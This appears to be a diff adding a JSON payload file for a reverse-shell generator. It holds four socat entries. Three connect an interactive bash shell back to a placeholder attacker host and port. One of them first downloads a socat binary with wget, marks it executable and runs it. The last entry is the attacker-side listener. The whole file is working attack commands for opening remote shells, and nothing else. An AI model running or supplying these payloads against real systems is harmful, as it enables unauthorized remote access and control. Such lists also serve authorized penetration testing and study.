@@ -1,0 +1,30 @@
+[
+  {
+    "type": "socat",
+    "direction": "reverse",
+    "payload": "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}",
+    "note": null,
+    "id": "socat1"
+  },
+  {
+    "type": "socat",
+    "direction": "reverse",
+    "payload": "socat tcp-connect:{LHOST}:{LPORT} exec:\"bash -li\",pty,stderr,setsid,sigint,sane",
+    "note": null,
+    "id": "socat2"
+  },
+  {
+    "type": "socat",
+    "direction": "reverse",
+    "payload": "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}",
+    "note": null,
+    "id": "socat3"
+  },
+  {
+    "type": "socat",
+    "direction": "reverse",
+    "payload": "socat file:`tty`,raw,echo=0 TCP-L:{LPORT}",
+    "note": "Listener (attacker)",
+    "id": "socat4"
+  }
+]
